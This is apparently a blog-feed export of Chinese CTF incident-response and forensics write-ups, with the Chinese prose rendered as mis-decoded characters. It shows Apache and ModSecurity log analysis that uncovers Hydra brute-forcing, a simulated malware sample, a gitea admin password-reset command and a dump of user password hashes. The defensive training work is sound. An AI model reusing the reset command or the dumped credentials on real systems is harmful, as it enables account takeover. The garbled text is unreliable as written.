alt="image-20250529115238121"></p><p>palu{md5{hack}}</p><p>åº”æ€¥å“åº”2-19</p><p>22äººå·²è§£ç­”</p><p>æ±Ÿå·çŒæ‰‹404notfoundflagé©»åœºç‰›é©¬</p><p>é¢˜ç›®æè¿°</p><p>æäº¤å†…éƒ¨ç¾¤ä¸­ç•™ä¸‹çš„flagå¹¶æäº¤</p><p>åˆ†æ•°</p><p>94.79 åˆ†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517171345253.png" alt="image-20250517171345253"></p><p>paluæœºå™¨2é‡Œæœ‰ä¸ªç¾¤èŠï¼Œç›´æ¥çœ‹å³å¯</p><p>åº”æ€¥å“åº”2-20</p><p>è¯·æäº¤æ”»å‡»è€…ä½¿ç”¨ç»´æŠ¤é¡µé¢è·å–åˆ°çš„æ•æ„Ÿå†…å®¹ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åœ¨wafä¸­å¯ä»¥å¯çœ‹åˆ°</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529140841717.png" alt="image-20250529140841717"></p><p>ä¸Šæ¸¸åœ°å€æ˜¯<a href="http://192.168.20.103:8080/%EF%BC%8C">http://192.168.20.103:8080/ï¼Œ</a></p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529140928679.png" alt="image-20250529140928679">è®¿é—®ä¹‹ï¼Œé‡Œé¢æœ‰è·¯ç”±ï¼Œ</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529140951433.png" alt="image-20250529140951433"></p><p>é‚£ä¹ˆå°±æ˜¯ä»–çš„æœåŠ¡ç»´æŠ¤ç•Œé¢äº†ã€‚</p><p>åœ¨wafä¸­å¹¶æ²¡æœ‰çœ‹åˆ°ç›¸å…³æ—¥å¿—ï¼Œé‚£å°±è¦å»å…¶ä»–åœ°æ–¹æ‰¾äº†ã€‚</p><p>åœ¨29é¢˜ä¸­ï¼Œæœ‰ä¸€ä¸ªgitæºç ç®¡ç†çš„åœ°æ–¹ã€‚</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529141307747.png" alt="image-20250529141307747"></p><p>æºä»£ç ç»™å‡ºäº†æ—¥å¿—æ–‡ä»¶</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529151410471.png" alt="image-20250529151410471"></p><p>å°±å¯ä»¥æ‰¾åˆ°ç›¸å…³æ—¥å¿—äº†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529151550458.png" alt="image-20250529151550458"></p><p>åº”æ€¥å“åº”2-21</p><p>æäº¤è·å–æ•æ„Ÿå†…å®¹IPçš„ç¬¬ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤æ—¶é—´ä½œä¸ºflagè¿›è¡Œæäº¤ã€‚flagæ ¼å¼ä¸ºpalu{xxxx-xx-xx:xx:xx:xx}</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529151709025.png" alt="image-20250529151709025"></p><p>ç¬¬ä¸€æ¡ä¾¿æ˜¯äº†</p><p>åº”æ€¥å“åº”2-22</p><p>æäº¤æ”»å‡»è€…ä½¿ç”¨çš„æ¶æ„ipå’Œç«¯å£flagæ ¼å¼ä¸ºpalu{xx.xx.xx.xx:xxxx}</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529151748978.png" alt="image-20250529151748978"></p><p>åº”æ€¥å“åº”2-23</p><p>æäº¤é‡è¦æ•°æ®çš„æ˜æ–‡å†…å®¹ä½œä¸ºflagæäº¤</p><p>åœ¨gitæ€»æœ‰hackçš„ä»£ç </p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250529153057549.png" alt="image-20250529153057549"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def custom_encrypt(text, key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [ord(c) for c in key]</span><br><span class="line"></span><br><span class="line">    for i, char in enumerate(text):</span><br><span class="line">        shifted = ord(char) + (i % 5 + 1)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % len(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; 0x0F) &lt;&lt; 4) | ((xored &amp; 0xF0) &gt;&gt; 4)</span><br><span class="line">        encrypted.append(f&quot;&#123;substituted:02x&#125;&quot;)</span><br><span class="line">    return &quot;&quot;.join(encrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†ä¼¼ä¹å¹¶æ²¡æœ‰ç»™key</p><p>c3a1c3c13e326020c3919093e1260525045e</p><p>palu3ä¸­ç»™äº†é‡è¦æ•°æ®</p><p>åº”æ€¥å“åº”2-24</p><p>æäº¤æ¶æ„ç»´æƒè½¯ä»¶çš„åç§°ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åº”æ€¥å“åº”2-32</p><p>2äººå·²è§£ç­”</p><p>testç«‹æ°´æ¡¥åˆ’æ°´ä¸‰é˜Ÿè™šä½ä»¥å¾…</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ”»å‡»è€…ç•™ä¸‹çš„æœ¨é©¬md5åä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>102.49 åˆ†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517150403071.png" alt="image-20250517150403071"></p><p>åº”æ€¥å“åº”2-36</p><p>13äººå·²è§£ç­”</p><p>0x7c00404notfoundflagGeekæå®‰äº‘ç§‘</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ¶æ„ç”¨æˆ·çš„æ•°é‡ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>96.85 åˆ†</p><p>åœ¨palu1 winä¸Šæœ‰100ä¸ª</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517165541426.png" alt="image-20250517165541426"></p><p>å»æ‰æœ¬èº«çš„è¿˜æœ‰99ä¸ª</p><p>99</p><p>åº”æ€¥å“åº”2-38</p><p>8äººå·²è§£ç­”</p><p>0x7c00test404notfoundflag</p><p>é¢˜ç›®æè¿°</p><p>æäº¤ä¸šåŠ¡æ•°æ®ä¸­æ”»å‡»è€…ç•™ä¸‹çš„ä¿¡æ¯ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>98.04 åˆ†</p><p>åœ¨æ•°æ®åº“ä¸­æœ‰ä¸ªflag</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517155955071.png" alt="image-20250517155955071"></p><p>åº”æ€¥å“åº”2-39</p><p>3äººå·²è§£ç­”</p><p>testäº‘å–µç«‹æ°´æ¡¥åˆ’æ°´ä¸‰é˜Ÿ</p><p>é¢˜ç›®æè¿°</p><p>æäº¤ç§äººgitä»“åº“ä¸­ç•™ä¸‹çš„å†…å®¹ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>100.25 åˆ†</p><p>åœ¨ä»“åº“ä¸­æœ‰ç•™ä¸‹çš„ä¿¡æ¯</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517160515087-17474691153161.png" alt="image-20250517160515087"></p><p>base64å³å¯</p><p>åº”æ€¥å“åº”2-40</p><p>8äººå·²è§£ç­”</p><p>test0x7c00ç ¥æŸ±</p><p>é¢˜ç›®æè¿°</p><p>æäº¤å­˜åœ¨åœ¨mysqlæœåŠ¡å™¨ä¸­çš„æ¶æ„ç¨‹åºçš„MD5ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>98.04 åˆ†</p><p>ç™»å½•mysqlæœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹historyï¼Œ</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517163114057.png" alt="image-20250517163114057"></p><p>æœ‰ä¸ª.aè¿™ä¸ªå°±æ˜¯äº†</p><p>åº”æ€¥å“åº”2-41</p><p>6äººå·²è§£ç­”</p><p>test0x7c00ç ¥æŸ±</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ¶æ„ç¨‹åºä¸­æ¨¡æ‹Ÿc2é€šä¿¡çš„å‡½æ•°åç§°ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>98.52 åˆ†</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517164527582.png" alt="image-20250517164527582"></p><p>æŠŠ.aæ”¾idaé‡Œï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³æ“ä½œ</p><p>simulate_network_communication</p><p>åº”æ€¥å“åº”2-42</p><p>6äººå·²è§£ç­”</p><p>test0x7c00ç ¥æŸ±</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ¶æ„ç¨‹åºåˆ›å»ºéšè—æ–‡ä»¶çš„åç§°ä½œä¸ºflagæäº¤</p><p>åˆ†æ•°</p><p>98.52 åˆ†</p><p>æŸ¥çœ‹.a  é‡Œé¢åˆ›å»ºäº†éšè—æ–‡ä»¶ï¼Œ</p><p><img src="D:\myBlog\images\ç¬¬äºŒå±ŠParlooCTFåº”æ€¥å“åº”æŒ‘æˆ˜èµ›éƒ¨åˆ†wp\image-20250517163705840.png" alt="image-20250517163705840"></p><p>å°±æ˜¯è¿™ä¸ªäº†ï¼Œ</p><p>åº”æ€¥å“åº”2-43</p><p>5äººå·²è§£ç­”</p><p>0x7c00ç ¥æŸ±Geekæå®‰äº‘ç§‘</p><p>é¢˜ç›®æè¿°</p><p>æäº¤æ¶æ„ç¨‹åºä¸­æ¨¡æ‹Ÿæƒé™æå‡çš„å‡½æ•°ä½œä¸ºflagè¿›è¡Œæäº¤</p><p>åˆ†æ•°</p><p>98.77 åˆ†</p><p>å¦‚ä¸Š</p><p>simulate_privilege_escalation</p><p>sudo gitea admin user change-password â€“username <a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#x61;&#x64;&#109;&#x69;&#x6e;&#x40;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a> â€“password 123456</p><p>admin        <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>    0    enabled    8231accbd6c278c47f9863b6e4e119f8c6994372e513c32ad89cb98f1b193b4e1425029b61e495bdfd11b20ccec3555642a5    pbkdf2$50000$50    0    0    0        0            029a5e0a032aa4c25cd66fbbc5c117de    b171d280fe6055840eb8153178a81cbc    zh-CN        1746368544    1747159639    1747159579    1    -1    1    1    0    0    0    1    0    34be3c7c0655313619d9b91a7e6f1ee6<br>hack        <a href="mailto:&#104;&#x61;&#99;&#107;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#104;&#x61;&#99;&#107;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a>    0    enabled    bfd762fa77fbe2cb55c81878fa343ed754464cf59a98d79e3baaea62d17f67ed57bb3404d2400f0c045d93588fc6f81ede73    pbkdf2$50000$50    0    0    0        0            cbbb72e134480ea1a2fd43cae954a282    6b887cf34c01f71b9c656a1c42d3c5cb    zh-CN        1747075693    1747075741    1747075693    1    -1    1    0    0    0    0    1    0    ca467a243edddda808379cd157864068<br>1        @qq.com    0    enabled    palu{crP1ZIVfqrkfdhGy}    argon2    0    0    0        0            aaaaaaaaaaaaaaa    aaaaaaaaaaaaaaa    zh-CN        1747075693    1747075693    1747075693    1    -1    1    0    0    0    0    1    0    aaaaaaaaaaaa</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å››å±Š&quot;é•¿åŸæ¯&quot;ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ€»å†³èµ›wp-æº¯æºå–è¯wp</title>
      <link href="/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/"/>
      <url>/2023/05/05/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B-%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰é¢"><a href="#å‰é¢" class="headerlink" title="å‰é¢"></a>å‰é¢</h3><p>æº¯æºå–è¯æœ¬æ¥ä»¥ä¸ºæ˜¯wiresharkåŒ…çš„ï¼Œæ²¡æƒ³åˆ°è¿™æ¬¡éƒ½æ˜¯æ—¥å¿—åŒ…ï¼Œæ€»å…±æœ‰ä¸¤ä¸ªæ—¥å¿—åŒ…ï¼Œä¸€ä¸ªæ˜¯è¯¦ç»†çš„ï¼Œä¸€ä¸ªæ˜¯ä¸è¯¦ç»†çš„ã€‚</p><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><p>1ï¼Œé»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘</p><p>2ï¼Œé»‘å®¢å—¦è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡</p><p>3ï¼Œé»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°</p><p>ä¸‹é¢å‡ ä¸ªæ²¡æœ‰æˆªå›¾ï¼Œä¸è¿‡è®°ä½å¤§æ¦‚äº†</p><p>4ï¼Œé»‘å®¢ç™»å½•æ—¶ä½¿ç”¨çš„è´¦å·å¯†ç ä¸ºå¤šå°‘ï¼Œæ ¼å¼è´¦å·ã€å¯†ç </p><p>5ï¼Œé»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘</p><p>6ï¼Œé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ æœ¨é©¬çš„ç»å¯¹è·¯å¾„ä¸ºå¤šå°‘ï¼Œè¯¥æœ¨é©¬æœªè¢«ä½¿ç”¨</p><p>ä¸‹é¢æ˜¯æ²¡æœ‰åšå‡ºæ¥çš„äº†ï¼Œæœ¬ç¯‡æ–‡ç« å°†ä»”ç»†åˆ†æ</p><p>7ï¼Œé»‘å®¢ä¸Šä¼ çš„æœ¨é©¬æ–¹å¼ä¸ºä»€ä¹ˆï¼Œæœ¨é©¬å¯†ç ä¸ºä»€ä¹ˆï¼Œå¤§å†™å­—æ¯ï¼Œç”¨ç©ºæ ¼åˆ†å¼€</p><p>8ï¼Œ9ï¼Œ10å°±ä¸å¤ªæ¸…æ¥šäº†ï¼Œè‚¯å®šæ˜¯ä¸€äº›åˆ©ç”¨æœ¨é©¬æ‰€æ“ä½œçš„å†…å®¹äº†ï¼Œèµ›åé—®å…¶ä»–å¤§å¸ˆå‚…ï¼Œæœ‰åå¼¹shellçš„ipï¼Œportå•¥çš„ï¼Œå› ä¸ºåé¢åˆ©ç”¨æœ¨é©¬çš„æ¬¡æ•°æ¯”è¾ƒå°‘ï¼Œæˆ‘ä»¬éƒ½åˆ†æä¸€ä¸‹ã€‚</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>è¿™é‡Œæ²¡æœ‰æŠŠæ•´ä¸ªç½‘ç«™ç›®å½•æ‰“åŒ…ï¼ŒåªæŠŠé‡è¦æ—¥å¿—ç•™äº†ä¸‹æ¥ï¼Œ</p><p>æœ‰éœ€è¦çš„å¸ˆå‚…å¯ä»¥ä¸‹è½½ä¸€ä¸‹ã€‚</p><p><a href="/images/tiesan/t3.7z">æµé‡åŒ…ä¸‹è½½</a></p><h4 id="1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘"><a href="#1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘" class="headerlink" title="1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘"></a>1é»‘å®¢æ”»å‡»æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„å†…ç½‘ipä¸ºå¤šå°‘</h4><p>åœ¨æ¯”èµ›ç°åœºï¼Œwebçš„ç½‘ç«™åœ¨/var/www/html/ä¸‹</p><p>webæ—¥å¿—åœ¨/var/log/httpd/ä¸‹ï¼Œæœ‰å¾ˆå¤šæ—¥å¿—æ–‡ä»¶,è¿™é‡Œå¤ä¹ åŸå› ï¼Œæˆ‘ä»¬å…ˆæŠŠæ—¥å¿—æ‹–åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</p><p><img src="/images/tiesan/image-20230505140424354.png" alt="image-20230505140424354"></p><p>ç¬¬ä¸€ä¸ªå¾ˆç®€å•ï¼Œå› ä¸ºå¦‚æœcatçš„è¯ï¼Œå¤ªé•¿äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨head æŸ¥çœ‹å‰å‡ ä¸ªå°±è¡Œï¼Œ</p><p>``head -n 10 access_log-20230426`</p><p><img src="/images/tiesan/image-20230505140539840.png" alt="image-20230505140539840"></p><p>å¯ä»¥çœ‹åˆ°192.168.12.140å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼Œuser-agentä¸ºâ€œMozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0â€ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ­£å¸¸çš„è¯·æ±‚ï¼Œæ¥ç€<code> head -n 100 access_log-20230426</code>çœ‹100æ¡æ—¥å¿—æ—¶ï¼Œ</p><p><img src="/images/tiesan/image-20230505141009132.png" alt="image-20230505141009132"></p><p>å°±å¯ä»¥çœ‹åˆ°åŸºæœ¬éƒ½æ˜¯404 ä¸”user-agentä¸ºâ€Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)â€è¿™ç§user-agentä¸€èˆ¬éƒ½ä¸æ˜¯æ­£å¸¸æœºå™¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­æ”»å‡»ipä¸º<code>192.168.12.140</code></p><p>flag:192.168.12.140</p><p><img src="/images/tiesan/image-20230505141302281.png" alt="image-20230505141302281"></p><h4 id="2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡"><a href="#2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡" class="headerlink" title="2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡"></a>2é»‘å®¢æ‰€è¿›è¡Œçš„ç›®å½•æ‰«æä¸€å…±æœ‰å¤šå°‘æ¡</h4><p>è¿™é‡Œä¸€æ¡ä¸€æ¡çš„æ•°è‚¯å®šä¸ç°å®ï¼Œå¯ä»¥grepè¿›è¡ŒåŒ¹é…ï¼Œç„¶åwcè¿›è¡Œè®¡æ•°ï¼ŒåŒ¹é…è¯ï¼Œæˆ‘ä»¬è¿›è¡Œuser-agentåŒ¹é…ï¼Œä¸Šé¢å·²ç»çœ‹åˆ°å¾ˆå¤š404çš„user-agentä¸ºâ€Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)â€,æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤</p><p><code> cat access_log-20230426 | grep &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&quot; | wc -l</code></p><p><img src="/images/tiesan/image-20230505141553056.png" alt="image-20230505141553056"></p><p>å³å¯å¾—å‡ºç­”æ¡ˆ</p><p>flag 55510</p><p><img src="/images/tiesan/image-20230505141628382.png" alt="image-20230505141628382"></p><h4 id="3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°"><a href="#3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°" class="headerlink" title="3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°"></a>3é»‘å®¢è¿›è¡Œè´¦å·å¯†ç çˆ†ç ´çš„æ¬¡æ•°</h4><p>è¿™é‡Œçˆ†ç ´æ¬¡æ•°ï¼Œå› ä¸ºå½“æ—¶æ¯”èµ›ç¯å¢ƒå®•æœºäº†ï¼Œå®ƒç°åœºé‚£ä¸ªwebï¼Œvncæ€»æ˜¯404ï¼Œè£åˆ¤é‚£è¾¹æŠŠæœåŠ¡å™¨è´¦å·å¯†ç éƒ½ç»™äº†ï¼Œsshèƒ½è¿æ¥ï¼Œæ‰€ä»¥å°±æŠŠæ—¥å¿—ä¸‹è½½ä¸‹æ¥äº†ï¼Œæ—¥å¿—å¤ªå¤§è®°äº‹æœ¬ä¸è¡Œï¼Œå‡ ä¸‡è¡Œå’Œå‡ ç™¾ä¸‡è¡Œçš„æ•°æ®ï¼Œåœ¨åšçš„æ—¶å€™ï¼Œç”¨ä¸€äº›å…¶ä»–ç¼–è¾‘å™¨æ‰“å¼€çš„æ—¶å€™ï¼Œä¼šåŒ¹é…ä¸åˆ°å„ç§å­—ç¬¦ï¼Œæœ€åç”¨vscodeåŒ¹é…ï¼Œå¾ˆæµç•…ä¸”ä¸æ»‘ã€‚</p><p>ç™»å½•çš„è¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼šæœ‰login ç™»å½•å…³é”®è¯ï¼Œæˆ‘ä»¬ç›´æ¥åŒ¹é…loginï¼Œ<code>cat access_log-20230426 | grep &quot;login&quot;</code></p><p><img src="/images/tiesan/image-20230505142323914.png" alt="image-20230505142323914"></p><p><img src="/images/tiesan/image-20230505142400480.png" alt="image-20230505142400480"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰çˆ†ç ´çš„ç—•è¿¹ï¼Œå› ä¸ºåœ¨ä¸Šé¢çˆ†ç ´ç›®å½•çš„æ—¶å€™ï¼Œä¹Ÿä¼šå­˜åœ¨loginï¼Œæ‰€ä»¥ä¸ºæˆ‘ä»¬å¯ä»¥åŒ¹é…â€œ/index.php?c=access&amp;a=loginâ€è¿™ä¸ªï¼Œè¿™æ ·å°±å°‘ä¸€ç‚¹</p><p><code> cat access_log-20230426 | grep &quot;index.php?c=access&amp;a=login&quot;</code></p><p><img src="/images/tiesan/image-20230505142936437.png" alt="image-20230505142936437"></p><p>è¿™æ ·åŒ¹é…ä¸‹æ¥ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæœ‰getå’Œpostå½¢å¼çš„ï¼Œæœ€é‡è¦å¯ä»¥çœ‹åˆ°å‰é¢å‡ æ¡ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åŒ¹é…è¿™ä¸ªhydraçš„çˆ†ç ´â€Mozilla/5.0 (Hydra)â€</p><p>root@Bohemian:/tools/tiesan# cat access_log-20230426 | grep â€œMozilla/5.0 (Hydra)â€ | wc -l</p><p><img src="/images/tiesan/image-20230505143241531.png" alt="image-20230505143241531"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯è¿™ä¹ˆå¤šæ¡ï¼Œä½†æ˜¯å…¶ä¸­ä¹ŸåŒ…å«äº†getè¯·æ±‚çš„ï¼Œhydraåœ¨çˆ†ç ´ç½‘é¡µçš„åŒæ—¶ä¼šå…ˆè¯·æ±‚ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ï¼Œé‚£å°±è¦å»æ‰GET</p><p>ç›´æ¥åœ¨åŒ¹é…<code>cat access_log-20230426 | grep &quot;Mozilla/5.0 (Hydra)&quot; |grep &quot;POST /index.php?c=access&amp;a=login HTTP/1.0&quot; |wc -l</code></p><p><img src="/images/tiesan/image-20230505143558618.png" alt="image-20230505143558618"></p><p>flag 2051</p><p><img src="/images/tiesan/image-20230505143616122.png" alt="image-20230505143616122"></p><h4 id="4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç "><a href="#4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç " class="headerlink" title="4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç "></a>4é»‘å®¢ç™»å½•æˆåŠŸæ‰€ç”¨çš„è´¦å·å¯†ç </h4><p>è¿™é‡Œè´¦å·å¯†ç çˆ†ç ´ï¼Œè‚¯å®šä¸åœ¨è¿™ä¸ªaccessçš„æ—¥å¿—ä¸­äº†ï¼Œä¼šæœ‰ä¸€ä¸ªè¯¦ç»†æ—¥å¿—åŒ…ï¼Œå°±æ˜¯ modsec_audit.log-20230426</p><p>4.26çš„æ—¥å¿—åŒ…</p><p><img src="/images/tiesan/image-20230505143833110.png" alt="image-20230505143833110"></p><p>æˆ‘ä»¬å†æ¬¡å›åˆ°ä¸Šé¢åŒ¹é…ç™»å½•å“ªé‡Œï¼Œå¯ä»¥çœ‹åˆ°ï¼Œhydraçˆ†ç ´æ—¶ï¼Œæœ€åæœ‰ä¸€ä¸ªç™»å½•çš„302çŠ¶æ€ç ï¼Œè¯´æ˜ç™»å½•æˆåŠŸï¼Œæ—¶é—´ä¸ºâ€œ [04/Dec/2019:16:22:34 +0800] â€ï¼Œæˆ‘ä»¬ç›´æ¥å»è¯¦ç»†æ—¥å¿—ä¸­æœç´¢ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨linuxåŒ¹é…ï¼Œä½†æ˜¯ä¸å»ºè®®ï¼Œå› ä¸ºä»–éƒ½æ˜¯åŒ¹é…ä¸€è¡Œï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œç›´æ¥æœ16:22:34</p><p><img src="/images/tiesan/image-20230505144150344.png" alt="image-20230505144150344"></p><p>å°±å¯ä»¥çœ‹åˆ°è´¦å·å¯†ç äº†ï¼Œlogin%5Busername%5D=admin&amp;login%5Bpassword%5D=p455w0rd&amp;configOptionSelect=Default</p><p>è´¦å·ä¸ºadmin</p><p>å¯†ç ä¸ºp455w0rd</p><p>flag admin/p455w0rd</p><h4 id="5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘"><a href="#5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘" class="headerlink" title="5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘"></a>5é»‘å®¢æ·»åŠ çš„emailåœ°å€ä¸ºå¤šå°‘</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œemailåœ°å€ä¸€èˆ¬éƒ½æœ‰å…³é”®å­—ä¸ºmailï¼Œç„¶åæ·»åŠ åœ°å€è‚¯å®šæ˜¯é»‘å®¢æ‰€ä¸ºï¼Œè¿™é‡Œä»–çš„user-agentæˆ‘ä»¬å¯ä»¥ä»ä¸Šé¢çŸ¥é“â€Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 